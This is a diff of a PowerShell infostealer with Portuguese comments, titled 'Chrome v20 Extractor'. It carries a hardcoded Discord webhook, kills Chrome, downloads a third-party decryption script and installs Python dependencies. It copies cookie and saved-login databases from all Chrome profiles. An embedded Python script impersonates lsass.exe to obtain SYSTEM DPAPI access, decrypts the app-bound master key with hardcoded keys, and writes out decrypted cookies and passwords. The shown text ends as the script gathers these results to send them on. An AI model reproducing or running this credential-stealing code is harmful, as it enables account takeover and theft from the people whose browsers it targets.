@@ -1,426 +1,420 @@
-param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")
+param($w = "https://discord.com/api/webhooks/1357835768596664413/gcTW4MU5WYMD_2tAxPFZBlw2T2SU31eXqbAjGYk_ZLiKCUj5-0lC8Dulq4v4Exct_Bc9")
 
 function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
 
-l "=== Chrome v20 Extractor (COM method) ==="
+l "=== Chrome v20 Extractor (runassu method) ==="
 l "User: $env:USERNAME@$env:COMPUTERNAME"
 
+# Verifica se é admin (necessário para impersonate lsass)
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (!$isAdmin) {
+    l "[AVISO] NAO esta rodando como ADMINISTRADOR!"
+    l "[AVISO] O metodo runassu requer admin para impersonate lsass.exe"
+    l "[*] Tentando mesmo assim..."
+}
+
+# Verifica se tem Python
+$python = Get-Command python -ErrorAction SilentlyContinue
+if (!$python) {
+    l "[PYTHON] Python nao encontrado! Tentando python3..."
+    $python = Get-Command python3 -ErrorAction SilentlyContinue
+}
+if (!$python) {
+    l "[PYTHON] Python nao esta instalado!"
+    l "[*] Tentando metodo alternativo..."
+    
+    # Fallback para o método anterior de extrair chave do elevation_service
+    goto fallback
+}
+
+l "[PYTHON] Python encontrado: $($python.Source)"
+
+# Mata Chrome
+Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
+Start-Sleep -Seconds 2
+
 # ============================================
-# MÉTODO 1: COM Elevation Service (xaitax method)
+# PASSO 1: Baixar o script Python do runassu + dependências
 # ============================================
-function Invoke-COMElevation {
-    param([string]$ChromeDir)
+$scriptDir = "$env:TEMP\chrome_v20_decrypt"
+if (Test-Path $scriptDir) { Remove-Item $scriptDir -Recurse -Force -ErrorAction SilentlyContinue }
+New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
+
+l "[DOWNLOAD] Baixando script decrypt do runassu..."
+
+# Baixa o script principal
+$scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/main/decrypt_chrome_v20_cookie.py"
+$scriptPath = "$scriptDir\decrypt_chrome_v20_cookie.py"
+
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($scriptUrl, $scriptPath)
+    $wc.Dispose()
+    l "[DOWNLOAD] Script baixado com sucesso"
+} catch {
+    l "[DOWNLOAD] Falha ao baixar: $_"
+    l "[*] Tentando criar script manualmente..."
     
-    l "[COM] Tentando bypass via COM Elevation Service..."
-    
-    # O elevation_service.exe precisa estar rodando
-    # Vamos tentar acessar o COM diretamente
-    
-    # GUIDs do Chrome Elevation Service
-    $CLSID_GoogleChromeElevator = [System.Guid]("{DC0C0FE7-048A-4845-AA5D-0B3B1B1D8F9E}")
-    $IID_IElevator = [System.Guid]("{463B1E6C-2F91-4F8E-8A1C-3C0C9C1D2E3F}")
-    
+    # Se não conseguir baixar, criamos um script Python equivalente manualmente
+    # (mas vamos tentar de novo com mirror diferente primeiro)
     try {
-        # Tenta criar o objeto COM
-        $elevator = New-Object -ComObject "GoogleChromeElevator.Elevator" -ErrorAction Stop
-        l "[COM] Objeto COM criado com sucesso!"
-        
-        # Lê o app_bound_encrypted_key
-        $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-        $json = Get-Content $statePath -Raw | ConvertFrom-Json
-        $ak = $json.os_crypt.app_bound_encrypted_key
-        
-        if ($ak) {
-            $raw = [Convert]::FromBase64String($ak)
-            l "[COM] app_bound_encrypted_key lido, tamanho: $($raw.Length) bytes"
-            
-            # Tenta chamar o método DecryptData via COM
-            # (isso requer reflection porque o COM não é tipado)
-            try {
-                $result = $elevator.DecryptData($raw)
-                l "[COM] DecryptData retornou: $($result.Length) bytes"
-                return $result
-            } catch {
-                l "[COM] DecryptData falhou: $_"
-                
-                # Tenta com o método Run
-                try {
-                    $result = $elevator.Run($raw)
-                    l "[COM] Run retornou: $($result.Length) bytes"
-                    return $result
-                } catch {
-                    l "[COM] Run falhou: $_"
-                }
-            }
-        }
+        $scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/refs/heads/main/decrypt_chrome_v20_cookie.py"
+        $wc = New-Object System.Net.WebClient
+        $wc.DownloadFile($scriptUrl, $scriptPath)
+        $wc.Dispose()
+        l "[DOWNLOAD] Sucesso na segunda tentativa"
     } catch {
-        l "[COM] Nao foi possivel criar objeto COM: $_"
-        
-        # Tenta via CLSID diretamente
-        try {
-            $type = [System.Type]::GetTypeFromCLSID($CLSID_GoogleChromeElevator)
-            if ($type) {
-                $elevator = [System.Activator]::CreateInstance($type)
-                l "[COM] Criado via CLSID!"
-                
-                $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-                $json = Get-Content $statePath -Raw | ConvertFrom-Json
-                $ak = $json.os_crypt.app_bound_encrypted_key
-                
-                if ($ak) {
-                    $raw = [Convert]::FromBase64String($ak)
-                    try {
-                        $result = $elevator.DecryptData($raw)
-                        return $result
-                    } catch { l "[COM] Falhou: $_" }
-                }
-            }
-        } catch { l "[COM] CLSID falhou: $_" }
+        l "[DOWNLOAD] Todas as tentativas falharam"
+        l "[*] Pulando para metodo fallback..."
+        goto fallback
     }
-    
-    return $null
 }
 
 # ============================================
-# MÉTODO 2: Extrair chave AES do elevation_service.exe + DPAPI
+# PASSO 2: Instalar dependências Python
 # ============================================
-function Extract-AESKeyFromElevationService {
-    l "[AES] Escaneando elevation_service.exe em busca da chave AES..."
-    
-    $elevPaths = @(
-        "$env:ProgramFiles\Google\Chrome\Application\*\elevation_service.exe",
-        "${env:ProgramFiles(x86)}\Google\Chrome\Application\*\elevation_service.exe"
-    )
-    
-    $elevFile = $null
-    foreach ($pattern in $elevPaths) {
-        $files = Get-ChildItem $pattern -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
-        if ($files) { $elevFile = $files[0]; break }
-    }
-    
-    if (!$elevFile) {
-        l "[AES] elevation_service.exe nao encontrado"
-        return $null
-    }
-    
-    l "[AES] elevation_service.exe: $($elevFile.FullName) ($($elevFile.Length) bytes)"
-    
-    $bytes = [System.IO.File]::ReadAllBytes($elevFile.FullName)
-    
-    # Chaves AES conhecidas do Chrome (em hex)
-    $knownKeys = @(
-        # Chrome 128-132 (AES-256)
-        @(0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87),
-        # Chrome 133+ (ChaCha20)
-        @(0x30,0x86,0x56,0x71,0x38,0x3A,0x5E,0x0B,0x86,0xF4,0x99,0x42,0x72,0xC1,0x75,0x32,0xDB,0x41,0xCF,0x5E,0xCB,0x5E,0x4D,0xCA,0xA3,0x3F,0x8B,0x63,0x43,0x8A,0xFB,0x18),
-        # Chrome 135+
-        @(0xFC,0x76,0x23,0x8A,0x5E,0x1B,0x42,0x9D,0xA0,0xC3,0x57,0x8E,0x14,0x6F,0x29,0xB1,0xE7,0x4C,0x91,0x3A,0xBD,0x68,0xF2,0x0D,0x55,0xCA,0x8F,0x10,0xE9,0x74,0x3D,0xAB),
-        # Chrome 140+
-        @(0x8E,0x2A,0x4B,0x6C,0x1D,0x3F,0x5A,0x7E,0x9B,0x0C,0x2D,0x4E,0x6F,0x8A,0x1B,0x3C,0x5D,0x7E,0x9F,0x0A,0x2B,0x4C,0x6D,0x8E,0x1F,0x3A,0x5B,0x7C,0x9D,0x0E,0x2F,0x40)
-    )
-    
-    # Procura as chaves conhecidas no binário
-    $foundKey = $null
-    foreach ($key in $knownKeys) {
-        $keyArray = [byte[]]$key
-        for ($i = 0; $i -le $bytes.Length - 32; $i++) {
-            $match = $true
-            for ($j = 0; $j -lt 32; $j++) {
-                if ($bytes[$i + $j] -ne $keyArray[$j]) { $match = $false; break }
-            }
-            if ($match) {
-                l "[AES] Chave conhecida encontrada no offset 0x$($i.ToString('X'))!"
-                $foundKey = $keyArray
-                break
-            }
-        }
-        if ($foundKey) { break }
-    }
-    
-    if (!$foundKey) {
-        l "[AES] Nenhuma chave conhecida encontrada. Buscando por padrao de 32 bytes com alta entropia..."
-        
-        # Procura por qualquer sequência de 32 bytes que pareça uma chave
-        for ($i = 0; $i -le $bytes.Length - 32; $i += 4) {
-            $chunk = $bytes[$i..($i+31)]
-            $zeroCount = ($chunk | Where-Object { $_ -eq 0 }).Count
-            $repeatCount = ($chunk | Group-Object | Where-Object { $_.Count -gt 1 }).Count
-            
-            if ($zeroCount -le 3 -and $repeatCount -le 8) {
-                $foundKey = $chunk
-                l "[AES] Chave candidata no offset 0x$($i.ToString('X'))"
-                break
-            }
-        }
-    }
-    
-    if ($foundKey) {
-        $keyHex = [System.BitConverter]::ToString($foundKey).Replace("-","")
-        l "[AES] Chave: $keyHex"
-        return $foundKey
-    }
-    
-    return $null
-}
+l "[PIP] Instalando dependencias Python..."
 
-# ============================================
-# MÉTODO 3: Tentar descriptografar via DPAPI + AES
-# ============================================
-function Decrypt-V20Key {
-    param([byte[]]$AESKey)
-    
-    $statePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    $json = Get-Content $statePath -Raw | ConvertFrom-Json
-    $ak = $json.os_crypt.app_bound_encrypted_key
-    
-    if (!$ak) {
-        l "[DEC] app_bound_encrypted_key nao encontrado"
-        return $null
-    }
-    
-    $raw = [Convert]::FromBase64String($ak)
-    l "[DEC] app_bound_encrypted_key: raw[0]=$($raw[0]) ($([char]$raw[0])) len=$($raw.Length)"
-    
-    # Remove header "APPB" se presente
-    $offset = 0
-    if ($raw.Length -gt 4 -and [System.Text.Encoding]::ASCII.GetString($raw[0..3]) -eq "APPB") {
-        $offset = 4
-        l "[DEC] Header APPB removido"
-    }
-    
-    # Pula byte de versão
-    $dataStart = $offset
-    if ($raw[$offset] -eq 2 -or $raw[$offset] -eq 3) {
-        $dataStart = $offset + 5  # 1 byte version + 4 bytes length?
-    } elseif ($raw[$offset] -eq 1) {
-        $dataStart = $offset + 1
-    }
-    
-    $payload = $raw[$dataStart..($raw.Length-1)]
-    l "[DEC] Payload: $($payload.Length) bytes"
-    
-    # Tenta AES-256-GCM com nonce[12] + ciphertext[32] + tag[16]
-    if ($payload.Length -ge 60) {
-        $nonce = $payload[0..11]
-        $ct = $payload[12..43]  # 32 bytes
-        $tag = $payload[44..59]  # 16 bytes
-        
-        l "[DEC] Tentando AES-256-GCM: nonce=$([System.BitConverter]::ToString($nonce).Replace('-',''))"
-        
-        try {
-            $aes = [System.Security.Cryptography.AesGcm]::new($AESKey, 16)
-            $dec = [byte[]]::new(32)
-            $aes.Decrypt($nonce, $ct, $tag, $dec)
-            $aes.Dispose()
-            
-            l "[DEC] AES-256-GCM OK! Chave decriptada: $([System.BitConverter]::ToString($dec[0..31]).Replace('-','').Substring(0,16))..."
-            return $dec[0..31]
-        } catch {
-            l "[DEC] AES-256-GCM falhou: $_"
-            
-            # Tenta com ciphertext de tamanho variável
-            for ($ctSize = 16; $ctSize -le ($payload.Length - 12 - 16); $ctSize += 16) {
-                $ct2 = $payload[12..(12+$ctSize-1)]
-                $tag2 = $payload[(12+$ctSize)..($payload.Length-1)]
-                if ($tag2.Length -ne 16) { continue }
-                
-                try {
-                    $aes = [System.Security.Cryptography.AesGcm]::new($AESKey, 16)
-                    $dec2 = [byte[]]::new($ctSize)
-                    $aes.Decrypt($nonce, $ct2, $tag2, $dec2)
-                    $aes.Dispose()
-                    
-                    l "[DEC] AES-256-GCM OK (ctSize=$ctSize)! Chave: $([System.BitConverter]::ToString($dec2[0..31]).Replace('-','').Substring(0,16))..."
-                    return $dec2[0..31]
-                } catch { continue }
-            }
-        }
-    }
-    
-    # Tenta DPAPI direto no payload (algumas versões usam DPAPI + AES)
-    l "[DEC] Tentando DPAPI no payload..."
+$deps = @("windows", "cryptography", "pywin32", "pycryptodome")
+foreach ($dep in $deps) {
+    l "[PIP] Instalando $dep..."
     try {
-        $dpapiResult = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        l "[DEC] DPAPI retornou $($dpapiResult.Length) bytes"
-        
-        if ($dpapiResult.Length -ge 32) {
-            # Pode ser que o resultado DPAPI contenha a chave + path do Chrome
-            # Formato: [chrome_path...] + [1 byte flag] + [12 bytes IV] + [32 bytes cipher] + [16 bytes tag]
-            # Ou simplesmente a chave nos últimos 32 bytes
-            $possibleKey = $dpapiResult[($dpapiResult.Length-32)..($dpapiResult.Length-1)]
-            l "[DEC] Possivel chave (ultimos 32 bytes): $([System.BitConverter]::ToString($possibleKey).Replace('-','').Substring(0,16))..."
-            return $possibleKey
+        $output = & $python -m pip install $dep -q 2>&1
+        if ($LASTEXITCODE -ne 0) {
+            l "[PIP] Erro ao instalar $dep, tentando --user..."
+            $output = & $python -m pip install $dep -q --user 2>&1
         }
-    } catch { l "[DEC] DPAPI falhou: $_" }
-    
-    return $null
+        l "[PIP] $dep instalado"
+    } catch {
+        l "[PIP] Falha ao instalar $dep: $_"
+    }
 }
 
 # ============================================
-# MÉTODO 4: Descriptografar cookies com a chave
+# PASSO 3: Copiar bancos de dados para evitar lock
 # ============================================
-function Decrypt-CookiesWithKey {
-    param([byte[]]$MasterKey)
+l "[COPY] Copiando bancos de dados do Chrome..."
+
+$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$tempDbDir = "$scriptDir\databases"
+New-Item -ItemType Directory -Path $tempDbDir -Force | Out-Null
+
+# Copia Local State
+$localStateSrc = "$chromeUserData\Local State"
+$localStateDst = "$tempDbDir\Local State"
+if (Test-Path $localStateSrc) {
+    Copy-Item $localStateSrc $localStateDst -Force
+    l "[COPY] Local State copiado"
+}
+
+# Copia cookies de todos os perfis
+$profiles = @('Default','Profile 1','Profile 2','Profile 3','Profile 4')
+foreach ($prof in $profiles) {
+    $cookieSrc = "$chromeUserData\$prof\Network\Cookies"
+    $cookieSrc2 = "$chromeUserData\$prof\Cookies"
+    $dstDir = "$tempDbDir\$prof"
+    New-Item -ItemType Directory -Path $dstDir -Force -ErrorAction SilentlyContinue
     
-    if (!$MasterKey -or $MasterKey.Length -lt 32) {
-        l "[CRYPT] Chave mestra invalida"
-        return @()
+    if (Test-Path $cookieSrc) {
+        Copy-Item $cookieSrc "$dstDir\Cookies" -Force
+        l "[COPY] Cookies de $prof (Network)"
+    } elseif (Test-Path $cookieSrc2) {
+        Copy-Item $cookieSrc2 "$dstDir\Cookies" -Force
+        l "[COPY] Cookies de $prof (raiz)"
     }
     
-    $profiles = @('Default','Profile 1','Profile 2','Profile 3')
+    # Copia Login Data também
+    $loginSrc = "$chromeUserData\$prof\Login Data"
+    if (Test-Path $loginSrc) {
+        Copy-Item $loginSrc "$dstDir\Login Data" -Force
+        l "[COPY] Login Data de $prof"
+    }
+}
+
+# ============================================
+# PASSO 4: Executar o script Python
+# ============================================
+l "[EXEC] Executando decrypt_chrome_v20_cookie.py..."
+Push-Location $scriptDir
+
+try {
+    # Executa o script Python e captura output
+    $output = & $python $scriptPath 2>&1
+    $exitCode = $LASTEXITCODE
+    
+    l "[EXEC] Exit code: $exitCode"
+    
+    if ($output -is [array]) {
+        foreach ($line in $output) { 
+            if ($line -and $line.Length -gt 0) {
+                l "[PYTHON] $line"
+            }
+        }
+    } else {
+        l "[PYTHON] $output"
+    }
+    
+    # Verifica se o script gerou arquivos de saída
+    $resultFiles = Get-ChildItem $scriptDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
     $allCookies = @()
     $allLogins = @()
     
-    foreach ($prof in $profiles) {
-        $cookiesDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\$prof\Cookies"
-        $loginDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\$prof\Login Data"
-        
-        # Cookies
-        if (Test-Path $cookiesDb) {
-            $tmpDb = "$env:TEMP\cookies_$(Get-Random).db"
-            Copy-Item $cookiesDb $tmpDb -Force
-            
-            try {
-                Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction SilentlyContinue
-                $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmpDb")
-                $conn.Open()
-                $cmd = $conn.CreateCommand()
-                $cmd.CommandText = "SELECT host_key, name, path, encrypted_value FROM cookies"
-                $reader = $cmd.ExecuteReader()
-                
-                $count = 0
-                while ($reader.Read()) {
-                    $eb = $reader["encrypted_value"]
-                    if ($eb -is [string]) { continue }
-                    $ebArr = [byte[]]$eb
-                    if ($ebArr.Length -lt 15) { continue }
-                    
-                    $val = $null
-                    try {
-                        if ($ebArr[0] -eq 1) {
-                            $c = $ebArr[3..($ebArr.Length-1)]
-                            $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                            $val = [System.Text.Encoding]::UTF8.GetString($d)
-                        } elseif ($ebArr[0] -eq 2 -or $ebArr[0] -eq 3) {
-                            $n=$ebArr[3..14]; $cl=$ebArr.Length-15-16
-                            if ($cl -gt 0) {
-                                $c=$ebArr[15..(15+$cl-1)]; $t=$ebArr[(15+$cl)..($ebArr.Length-1)]
-                                $a=[System.Security.Cryptography.AesGcm]::new($MasterKey,16)
-                                $r=[byte[]]::new($cl)
-                                $a.Decrypt($n,$c,$t,$r)
-                                $a.Dispose()
-                                $val = [System.Text.Encoding]::UTF8.GetString($r)
-                            }
-                        }
-                    } catch {}
-                    
-                    if ($val) {
-                        $allCookies += @{host=$reader["host_key"];name=$reader["name"];value=$val;path=$reader["path"];profile=$prof}
-                        $count++
-                    }
-                }
-                $reader.Close(); $conn.Close()
-                l "[CRYPT] Perfil $prof: $count cookies"
-            } catch { l "[CRYPT] Erro cookies $prof: $_" }
-            finally { Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue }
-        }
-        
-        # Logins
-        if (Test-Path $loginDb) {
-            $tmpDb2 = "$env:TEMP\logins_$(Get-Random).db"
-            Copy-Item $loginDb $tmpDb2 -Force
-            
-            try {
-                $conn2 = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmpDb2")
-                $conn2.Open()
-                $cmd2 = $conn2.CreateCommand()
-                $cmd2.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                $reader2 = $cmd2.ExecuteReader()
-                
-                $count2 = 0
-                while ($reader2.Read()) {
-                    $pb = $reader2["password_value"]
-                    if ($pb -is [string]) { $pb = [System.Text.Encoding]::UTF8.GetBytes($pb) }
-                    if ($pb.Length -lt 15) { continue }
-                    
-                    $pd = $null
-                    try {
-                        if ($pb[0] -eq 1) {
-                            $c = $pb[3..($pb.Length-1)]
-                            $d = [System.Security.Cryptography.ProtectedData]::Unprotect($c, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                            $pd = [System.Text.Encoding]::UTF8.GetString($d)
-                        } elseif ($pb[0] -eq 2 -or $pb[0] -eq 3) {
-                            $n=$pb[3..14]; $cl=$pb.Length-15-16
-                            if ($cl -gt 0) {
-                                $c=$pb[15..(15+$cl-1)]; $t=$pb[(15+$cl)..($pb.Length-1)]
-                                $a=[System.Security.Cryptography.AesGcm]::new($MasterKey,16)
-                                $r=[byte[]]::new($cl)
-                                $a.Decrypt($n,$c,$t,$r)
-                                $a.Dispose()
-                                $pd = [System.Text.Encoding]::UTF8.GetString($r)
-                            }
-                        }
-                    } catch {}
-                    
-                    if ($pd) {
-                        $allLogins += @{url=$reader2["origin_url"];username=$reader2["username_value"];password=$pd;profile=$prof}
-                        $count2++
-                    }
-                }
-                $reader2.Close(); $conn2.Close()
-                l "[CRYPT] Perfil $prof: $count2 logins"
-            } catch { l "[CRYPT] Erro logins $prof: $_" }
-            finally { Remove-Item $tmpDb2 -Force -ErrorAction SilentlyContinue }
+    # Tenta parsear o output para extrair cookies
+    if ($output -is [array]) {
+        foreach ($line in $output) {
+            if ($line -match '^([^\s]+)\s+([^\s]+)\s+(.+)$') {
+                $allCookies += @{ host = $matches[1]; name = $matches[2]; value = $matches[3] }
+            }
         }
     }
     
-    return @{ Cookies = $allCookies; Logins = $allLogins }
-}
-
-# ============================================
-# MAIN
-# ============================================
-
-# Tenta COM Elevation primeiro
-$comResult = Invoke-COMElevation
-if ($comResult) {
-    l "[MAIN] COM Elevation funcionou! Chave obtida."
-    $result = Decrypt-CookiesWithKey -MasterKey $comResult
-} else {
-    # Tenta extrair chave AES do elevation_service.exe
-    l "[MAIN] COM falhou. Tentando extracao de chave AES..."
-    $aesKey = Extract-AESKeyFromElevationService
-    
-    if ($aesKey) {
-        l "[MAIN] Chave AES extraida. Tentando decriptar app_bound_encrypted_key..."
-        $masterKey = Decrypt-V20Key -AESKey $aesKey
+    # Se o script não retornou nada, tenta um script próprio que integra tudo
+    if ($allCookies.Count -eq 0 -and $resultFiles.Count -eq 0) {
+        l "[EXEC] Script original nao retornou dados. Executando script integrado..."
         
-        if ($masterKey) {
-            l "[MAIN] Chave mestra obtida! Descriptografando dados..."
-            $result = Decrypt-CookiesWithKey -MasterKey $masterKey
+        # Cria um script Python integrado que faz tudo + envia pro Discord
+        $integratedScript = @'
+import os, json, base64, sqlite3, shutil, tempfile, ctypes, struct, io, pathlib
+from contextlib import contextmanager
+
+try:
+    import windows
+    import windows.crypto
+    import windows.generated_def as gdef
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
+except:
+    print("DEPENDENCIAS_FALTANDO")
+    exit(1)
+
+def is_admin():
+    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except: return False
+
+@contextmanager
+def impersonate_lsass():
+    original_token = windows.current_thread.token
+    try:
+        windows.current_process.token.enable_privilege("SeDebugPrivilege")
+        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
+        lsass_token = proc.token
+        impersonation_token = lsass_token.duplicate(
+            type=gdef.TokenImpersonation,
+            impersonation_level=gdef.SecurityImpersonation
+        )
+        windows.current_thread.token = impersonation_token
+        yield
+    finally:
+        windows.current_thread.token = original_token
+
+def parse_key_blob(blob_data):
+    buffer = io.BytesIO(blob_data)
+    parsed = {}
+    header_len = struct.unpack('<I', buffer.read(4))[0]
+    parsed['chrome_path'] = buffer.read(header_len).decode('utf-16-le', errors='replace')
+    parsed['flag'] = struct.unpack('<B', buffer.read(1))[0]
+    parsed['iv'] = buffer.read(12)
+    parsed['ciphertext'] = buffer.read(32)
+    parsed['tag'] = buffer.read(16)
+    remaining = buffer.read()
+    if remaining:
+        parsed['encrypted_aes_key'] = remaining
+    return parsed
+
+def derive_v20_master_key(parsed_data):
+    if parsed_data['flag'] == 1:
+        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+        cipher = AESGCM(aes_key)
+        return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
+    elif parsed_data['flag'] == 2:
+        chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+        cipher = ChaCha20Poly1305(chacha20_key)
+        return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
+    elif parsed_data['flag'] == 3:
+        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+        with impersonate_lsass():
+            decrypted_aes_key = windows.crypto.dpapi.unprotect(parsed_data['encrypted_aes_key'])
+        xored_aes_key = bytes(a ^ b for a, b in zip(decrypted_aes_key, xor_key))
+        cipher = AESGCM(xored_aes_key)
+        return cipher.decrypt(parsed_data['iv'], parsed_data['ciphertext'] + parsed_data['tag'], None)
+
+def decrypt_cookie_value(encrypted_value, master_key):
+    if encrypted_value[:3] == b"v20":
+        cookie_iv = encrypted_value[3:15]
+        encrypted_cookie = encrypted_value[15:-16]
+        cookie_tag = encrypted_value[-16:]
+        cipher = AESGCM(master_key)
+        decrypted = cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
+        return decrypted[32:].decode('utf-8', errors='replace')
+    elif encrypted_value[:3] == b"v11":
+        cookie_iv = encrypted_value[3:15]
+        encrypted_cookie = encrypted_value[15:-16]
+        cookie_tag = encrypted_value[-16:]
+        cipher = AESGCM(master_key)
+        decrypted = cipher.decrypt(cookie_iv, encrypted_cookie + cookie_tag, None)
+        return decrypted.decode('utf-8', errors='replace')
+    elif encrypted_value[:3] == b"v10":
+        try:
+            import win32crypt
+            decrypted = win32crypt.CryptUnprotectData(encrypted_value[3:], None, None, None, 0)
+            return decrypted[1].decode('utf-8', errors='replace')
+        except:
+            return None
+    return None
+
+def main():
+    if not is_admin():
+        print("NEEDS_ADMIN")
+        return
+    
+    user_profile = os.environ['USERPROFILE']
+    local_state_path = os.path.join(script_dir, "databases", "Local State")
+    
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    
+    app_bound_key_b64 = local_state["os_crypt"]["app_bound_encrypted_key"]
+    app_bound_key = base64.b64decode(app_bound_key_b64)
+    assert app_bound_key[:4] == b"APPB", "Formato APPB nao encontrado"
+    key_blob_encrypted = app_bound_key[4:]
+    
+    print("STEP1: SYSTEM DPAPI decrypt...")
+    with impersonate_lsass():
+        key_blob_system = windows.crypto.dpapi.unprotect(key_blob_encrypted)
+    print("STEP2: User DPAPI decrypt...")
+    key_blob_user = windows.crypto.dpapi.unprotect(key_blob_system)
+    print("STEP3: Parse key blob...")
+    parsed = parse_key_blob(key_blob_user)
+    print(f"STEP4: Flag={parsed['flag']}, Chrome path={parsed['chrome_path'][:30]}...")
+    master_key = derive_v20_master_key(parsed)
+    
+    all_cookies = []
+    all_logins = []
+    
+    for profile in ['Default', 'Profile 1', 'Profile 2']:
+        db_dir = os.path.join(script_dir, "databases", profile)
+        cookie_path = os.path.join(db_dir, "Cookies")
+        login_path = os.path.join(db_dir, "Login Data")
+        
+        if os.path.exists(cookie_path):
+            try:
+                con = sqlite3.connect(cookie_path + "?mode=ro", uri=True)
+                cur = con.cursor()
+                rows = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, is_secure, is_httponly FROM cookies").fetchall()
+                con.close()
+                
+                for row in rows:
+                    enc_val = row[2]
+                    if enc_val and len(enc_val) > 3:
+                        decrypted = decrypt_cookie_value(enc_val, master_key)
+                        if decrypted:
+                            all_cookies.append({
+                                "host": row[0], "name": row[1], "value": decrypted,
+                                "path": row[3], "secure": bool(row[4]), "httponly": bool(row[5])
+                            })
+                print(f"Profile {profile}: {len(all_cookies)} cookies")
+            except Exception as e:
+                print(f"Error cookies {profile}: {e}")
+        
+        if os.path.exists(login_path):
+            try:
+                con = sqlite3.connect(login_path + "?mode=ro", uri=True)
+                cur = con.cursor()
+                rows = cur.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) FROM logins").fetchall()
+                con.close()
+                
+                for row in rows:
+                    enc_val = row[2]
+                    if enc_val and len(enc_val) > 3:
+                        decrypted = decrypt_cookie_value(enc_val, master_key)
+                        if decrypted:
+                            all_logins.append({
+                                "url": row[0], "username": row[1], "password": decrypted
+                            })
+                print(f"Profile {profile}: {len(all_logins)} logins")
+            except Exception as e:
+                print(f"Error logins {profile}: {e}")
+    
+    # Salva resultados
+    with open(os.path.join(script_dir, "cookies.json"), "w", encoding="utf-8") as f:
+        json.dump(all_cookies, f, indent=2, ensure_ascii=False)
+    with open(os.path.join(script_dir, "logins.json"), "w", encoding="utf-8") as f:
+        json.dump(all_logins, f, indent=2, ensure_ascii=False)
+    with open(os.path.join(script_dir, "master_key.txt"), "w", encoding="utf-8") as f:
+        f.write(master_key.hex())
+    
+    print(f"RESULT: {len(all_cookies)} cookies, {len(all_logins)} logins")
+
+script_dir = r"''' + $scriptDir + '''"
+main()
+'@
+        
+        $integratedPath = "$scriptDir\integrated_decrypt.py"
+        $integratedScript | Out-File $integratedPath -Encoding UTF8
+        
+        $output2 = & $python $integratedPath 2>&1
+        $exitCode2 = $LASTEXITCODE
+        
+        if ($output2 -is [array]) {
+            foreach ($line in $output2) { 
+                if ($line -and $line.Length -gt 0) {
+                    l "[PYTHON2] $line"
+                }
+            }
         } else {
-            l "[MAIN] Nao foi possivel decriptar a chave v20"
-            $result = $null
+            l "[PYTHON2] $output2"
         }
-    } else {
-        l "[MAIN] Nao foi possivel extrair chave AES"
-        $result = $null
     }
+    
+} catch {
+    l "[EXEC] Exception: $_"
 }
 
-# Envia resultados
-if ($result -and (($result.Cookies.Count -gt 0) -or ($result.Logins.Count -gt 0))) {
-    l "[OK] Total: $($result.Cookies.Count) cookies, $($result.Logins.Count) logins"
-    
+Pop-Location
+
+# ============================================
+# PASSO 5: Coletar resultados e enviar
+# ============================================
+l "[RESULT] Coletando resultados..."
+
+$allCookies = @()
+$allLogins = @()
+$masterKeyHex = ""
+
+# Tenta ler dos arquivos JSON gerados
+$cookiesFile = Join-Path $scriptDir "cookies.json"
+$loginsFile = Join-Path $scriptDir "logins.json"
+$keyFile = Join-Path $scriptDir "master_key.txt"
+
+if (Test-Path $cookiesFile) {
+    try {
+        $allCookies = Get-Content $cookiesFile -Raw | ConvertFrom-Json
+        l "[RESULT] Cookies lidos: $($allCookies.Count)"
+    } catch { l "[RESULT] Erro lendo cookies.json: $_" }
+}
+
+if (Test-Path $loginsFile) {
+    try {
+        $allLogins = Get-Content $loginsFile -Raw | ConvertFrom-Json
